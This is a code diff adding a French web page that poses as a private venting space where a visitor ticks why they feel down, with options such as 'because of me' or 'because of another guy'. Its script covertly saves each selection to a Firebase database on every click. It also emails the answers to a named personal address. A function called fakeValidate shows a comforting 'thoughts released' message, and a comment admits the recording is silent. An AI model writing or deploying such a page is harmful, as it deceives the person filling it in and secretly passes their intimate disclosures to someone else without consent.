@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Espace d'expression</title>
+    <style>
+        body { background: #0a0c12; color: #c9d1d9; font-family: 'Plus Jakarta Sans', sans-serif; text-align: center; padding: 60px 20px; margin: 0; }
+        .card { max-width: 620px; margin: 0 auto; background: #111827; padding: 50px 30px; border-radius: 24px; box-shadow: 0 25px 60px rgba(0,0,0,0.5); }
+        h2 { color: #fcf6ba; margin-bottom: 15px; }
+        p.intro { margin: 25px 0 30px 0; font-size: 1.05rem; line-height: 1.65; }
+        .intro-strong { color: #ff80df; font-weight: 600; }
+        .subtitle { color: #ff80df; margin: 30px 0 15px 0; font-size: 1.1rem; font-weight: 600; }
+        .note { color: #a1a1aa; font-size: 0.95rem; margin: 25px 0 35px 0; font-style: italic; }
+        label { display: block; margin: 12px auto; max-width: 480px; text-align: left; font-size: 1.03rem; cursor: pointer; line-height: 1.5; }
+        input[type="checkbox"] { margin-right: 12px; transform: scale(1.2); }
+        .thanks { margin-top: 30px; font-size: 1.1rem; color: #8b5cf6; min-height: 28px; font-style: italic; }
+        button { 
+            margin-top: 35px; 
+            padding: 16px 45px; 
+            font-size: 1.05rem; 
+            background: #6366f1; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            font-weight: 600;
+            transition: background 0.3s ease;
+        }
+        button:hover { background: #4f46e5; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Espace exutoire 💭</h2>
+    <p class="intro">
+        Besoin de poser les choses sans prise de tête ?<br><br>
+        Si tu devais poser tes pensées ici juste pour te vider la tête, tu dirais quoi ?<br>
+        <span class="intro-strong">Pas de filtre, coche ce qui résonne en toi pour te soulager.</span>
+    </p>
+
+    <p class="note">
+        Zone d'expression libre. Pose ce que tu as sur le cœur et passe à autre chose.
+    </p>
+
+    <div class="subtitle">Ce qui te pèse ou te rend gris :</div>
+    <label><input type="checkbox" value="1" onchange="saveSelections()"> 1) Tu es gris à cause du taf uniquement</label>
+    <label><input type="checkbox" value="2" onchange="saveSelections()"> 2) Tu es gris à cause de moi</label>
+    <label><input type="checkbox" value="3" onchange="saveSelections()"> 3) Tu es gris à cause d'un autre gars</label>
+    <label><input type="checkbox" value="4" onchange="saveSelections()"> 4) Tu es gris de la vie en général</label>
+
+    <button onclick="fakeValidate()">Mettre de côté / Libérer la pensée</button>
+
+    <div id="status" class="thanks"></div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script>
+    const firebaseConfig = { databaseURL: "https://roms-vote-default-rtdb.europe-west1.firebasedatabase.app" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    emailjs.init({ publicKey: "5m3HlCIUn6OkqDYMy" });
+
+    function sendEmailNotification(selected) {
+        if (selected.length === 0) return;
+
+        const labels = {
+            1: "Tu es gris à cause du taf uniquement",
+            2: "Tu es gris à cause de moi",
+            3: "Tu es gris à cause d'un autre gars",
+            4: "Tu es gris de la vie en général"
+        };
+
+        const messageText = selected.map(num => `${num}) ${labels[num] || 'Choix inconnu'}`).join("\n\n");
+
+        emailjs.send("service_quyacff", "template_vekw5ae", {
+            to_email: "ryo.saeba75012@outlook.fr",
+            message: messageText,
+            date: new Date().toLocaleString('fr-FR')
+        });
+    }
+
+    function saveSelections() {
+        const selected = Array.from(document.querySelectorAll('input[type="checkbox"]:checked'))
+                             .map(cb => parseInt(cb.value));
+
+        // Enregistrement silencieux sans message trompeur à l'écran
+        db.ref('reponses').set(selected.length > 0 ? selected : null).then(() => {
+            sendEmailNotification(selected);
+        });
+    }
+
+    function fakeValidate() {
+        const selected = Array.from(document.querySelectorAll('input[type="checkbox"]:checked'))
+                             .map(cb => parseInt(cb.value));
+
+        const statusEl = document.getElementById('status');
+        if (selected.length > 0) {
+            statusEl.innerText = "Pensées posées. Respire un coup, ça va aller ! ✨";
+            sendEmailNotification(selected);
+        } else {
+            statusEl.innerText = "Sélectionne au moins une option si tu veux déposer quelque chose.";
+        }
+        setTimeout(() => { statusEl.textContent = ""; }, 4000);
+    }
+</script>
+</body>
+</html>
